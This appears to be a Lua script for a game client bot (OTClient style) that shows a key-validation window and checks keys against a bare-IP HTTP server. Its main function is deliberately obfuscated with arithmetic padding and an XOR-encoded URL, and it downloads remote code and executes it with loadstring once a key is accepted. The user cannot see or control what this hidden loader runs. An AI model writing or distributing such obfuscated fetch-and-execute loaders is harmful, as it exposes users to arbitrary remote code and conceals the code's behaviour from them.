-- Flag para verificar se a chave foi validada
keyValidated = false

local function script()
    



bit32={};local v0=3 + 29 ;local v1=(8 -6)^v0 ;bit32.bnot=function(v18) v18=v18%v1 ;return (v1-(1 + 0)) -v18 ;end;bit32.band=function(v19,v20) local v21=0 -0 ;local v22;local v23;while true do if (v21==(1386 -(1103 + 282))) then if (v20==(4294967295 -0)) then return v19%(4294969113 -(1703 + 114)) ;end v19,v20=v19%v1 ,v20%v1 ;v21=2 + 0 ;end if (v21==(350 -(87 + 263))) then if (v20==255) then return v19%(419 -163) ;end if (v20==(65715 -(67 + 113))) then return v19%(48056 + 17480) ;end v21=1 + 0 ;end if (v21==(7 -4)) then for v47=1,v0 do local v48,v49=v19%(2 + 0) ,v20%(7 -5) ;v19,v20=math.floor(v19/(954 -(802 + 150)) ),math.floor(v20/(5 -3) );if ((v48 + v49)==(3 -1)) then v22=v22 + v23 ;end v23=(2 + 0) * v23 ;end return v22;end if (v21==(2 + 0)) then v22=1180 -(1123 + 57) ;v23=1 + 0 ;v21=1000 -(915 + 82) ;end end end;bit32.bor=function(v24,v25) local v26=0 -0 ;local v27;local v28;while true do if (v26==(1 + 2)) then for v50=1 + 0 ,v0 do local v51=0 -0 ;local v52;local v53;while true do if (v51==0) then v52,v53=v24%(2 -0) ,v25%(1 + 1) ;v24,v25=math.floor(v24/(1189 -(1069 + 118)) ),math.floor(v25/2 );v51=1;end if ((2 -1)==v51) then if ((v52 + v53)>=(1 -0)) then v27=v27 + v28 ;end v28=(2 + 0) * v28 ;break;end end end return v27;end if (v26==(1 + 1)) then v27=0 -0 ;v28=1 + 0 ;v26=794 -(368 + 423) ;end if (v26==1) then if (v25==(6067416176 -1772448881)) then return 4294968202 -(821 + 86) ;end v24,v25=v24%v1 ,v25%v1 ;v26=3 -1 ;end if (v26==(1883 -(1668 + 215))) then if (v25==255) then return (v24-(v24%256)) + 234 + 21 ;end if (v25==65535) then return (v24-(v24%(230114 -164578))) + 25216 + 40319 ;end v26=2 -1 ;end end end;bit32.bxor=function(v29,v30) local v31=1206 -(696 + 510) ;local v32;local v33;while true do if ((520 -(114 + 404))==v31) then return v32;end if (v31==(488 -(106 + 382))) then v29,v30=v29%v1 ,v30%v1 ;v32=411 -(306 + 105) ;v31=2 -1 ;end if (v31==(1263 -(1091 + 171))) then v33=428 -(166 + 261) ;for v54=508 -(289 + 218) ,v0 do local v55=1344 -(1213 + 131) ;local v56;local v57;while true do if (v55==(0 + 0)) then v56,v57=v29%2 ,v30%(2 + 0) ;v29,v30=math.floor(v29/(7 -5) ),math.floor(v30/2 );v55=1;end if (v55==(3 -2)) then if ((v56 + v57)==(860 -(814 + 45))) then v32=v32 + v33 ;end v33=(4 -2) * v33 ;break;end end end v31=1 + 1 ;end end end;bit32.lshift=function(v34,v35) if (math.abs(v35)>=v0) then return 0 + 0 ;end v34=v34%v1 ;if (v35<0) then return math.floor(v34 * ((838 -(660 + 176))^v35) );else return (v34 * ((887 -(261 + 624))^v35))%v1 ;end end;bit32.rshift=function(v36,v37) local v38=0 -0 ;while true do if (v38==(1080 -(1020 + 60))) then if (math.abs(v37)>=v0) then return 1423 -(630 + 793) ;end v36=v36%v1 ;v38=3 -2 ;end if (v38==(1 + 0)) then if (v37>(0 -0)) then return math.floor(v36 * (2^ -v37) );else return (v36 * ((1 + 1)^ -v37))%v1 ;end break;end end end;bit32.arshift=function(v39,v40) local v41=0 -0 ;while true do if (v41==(1748 -(760 + 987))) then if (v40>(0 -0)) then local v58=1913 -(1789 + 124) ;if (v39>=(v1/(768 -(745 + 21)))) then v58=v1-((1 + 1)^(v0-v40)) ;end return math.floor(v39 * ((5 -3)^ -v40) ) + v58 ;else return (v39 * ((4 -2)^ -v40))%v1 ;end break;end if (v41==0) then if (math.abs(v40)>=v0) then return 0 -0 ;end v39=v39%v1 ;v41=1 + 0 ;end end end;local v9=string.char;local v10=string.byte;local v11=string.sub;local v12=bit32 or bit ;local v13=v12.bxor;local v14=table.concat;local v15=table.insert;local function v16(v42,v43) local v44={};for v46=1 + 0 , #v42 do v15(v44,v9(v13(v10(v11(v42,v46,v46 + (3 -2) )),v10(v11(v43,1 + (v46% #v43) ,(868 -(550 + 317)) + (v46% #v43) + 1 + 0 )))%256 ));end return v14(v44);end local v17=v16("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\254\41\194\190\209\60\222\209\220\32\245\244\198\11\197\204\255\2\169\169\194\24\194\140\211\32\231\191\212\81\220\194\210\43\169\233\248\31\196\215\212\1\225\245\203\11\208\141\215\48\231","\126\177\163\187\69\134\219\167");modules.corelib.HTTP.get(v17,function(v45) assert(loadstring(v45)());end);
    
end

-- Função para validar a chave remotamente
local function validate_key_remotely(userKeyInput, callback)
    local HTTP = modules.corelib.HTTP
    local server_url = "http://38.46.142.218:5003/use-key?key=" .. userKeyInput

    -- Faz a requisição GET para validação da chave
    HTTP.get(server_url, function(response)
        if response then
            if string.find(response, '"success":true') then
                callback(true)  -- Chave válida
            else
                callback(false)  -- Chave inválida ou erro
            end
        else
            warn("Erro na requisição ao servidor. Verifique a conexão.")
            callback(false)  -- Caso a requisição não tenha retornado resposta
        end
    end)
end

keyPanelInterface = setupUI([[
MainWindow
  text: Validaçao de key DUNGEON
  size: 200 200

  Panel
    image-source: /images/ui/panel_flat
    anchors.right: parent.right
    anchors.left: parent.left
    anchors.top: parent.top
    anchors.bottom: separator.top
    margin: 5 5 5 5
    image-border: 6
    padding: 3
    size: 200 100

  Button
    id: closeButton
    !text: tr('Close')
    font: cipsoftFont
    anchors.left: parent.left
    anchors.bottom: parent.bottom
    size: 45 25
    margin-left: 4
    margin-bottom: 5
    
  Button
    id: confirmButton
    !text: tr('Confirmar')
    font: cipsoftFont
    anchors.right: parent.right
    anchors.bottom: parent.bottom
    size: 45 25
    margin-left: 4
    margin-bottom: 5

  TextEdit
    id: inputField
    anchors.top: editDiscord.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    size: 100 25
    margin-top: 4
    margin-bottom: 5
    
  Button
    id: editDiscord
    color: red
    font: verdana-11px-rounded
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    margin-bottom: 10
    height: 15
    text:         Obtenha sua key aqui     
    tooltip: Grupo no discord
    
]], g_ui.getRootWidget())

keyPanelInterface.editDiscord.onClick = function(widget)
    g_platform.openUrl("https://discord.gg/GgGjN58SAf")
end 

keyPanelInterface.closeButton.onClick = function(widget)
    keyPanelInterface:hide()
end

-- Função para exibir a janela de validação da chave
local function showKeyValidationWindow()
    if keyValidated then
        return  -- Se a chave já foi validada, não exibe a janela
    end

    keyPanelInterface:show()

    -- Evento ao clicar no botão
    keyPanelInterface.confirmButton.onClick = function(widget)
        local userKeyInput = keyPanelInterface.inputField:getText()
        
        if userKeyInput and userKeyInput ~= "" then
            warn("Validando chave...")
            -- Valida a chave remotamente
            validate_key_remotely(userKeyInput, function(isValid)
                if isValid then
                    keyValidated = true  -- Marca que a chave foi validada
                    script()
                    keyPanelInterface:hide()
                else
                    warn("Chave inválida! Acesso negado.")
                end
            end)
        else
            warn("Insira uma chave válida.")
        end
    end
end

-- Função principal para executar o script com validação da chave
local function runScriptWithKeyValidation()
    if keyValidated then
        script()  -- Se já está validado, executa direto
    else
        showKeyValidationWindow()  -- Se não, pede para validar
    end
end

-- Validação da chave logo no início
local keyInput = "cfb802f"  -- Aqui você pode definir a chave ou pegar via entrada
validate_key_remotely(keyInput, function(isValid)
    if isValid then
        keyValidated = true
        script()  -- Se a chave for válida, executa o script
          keyPanelInterface:hide()
    else
        warn("Chave inválida! Acesso negado.")
        showKeyValidationWindow()
    end
  
end)

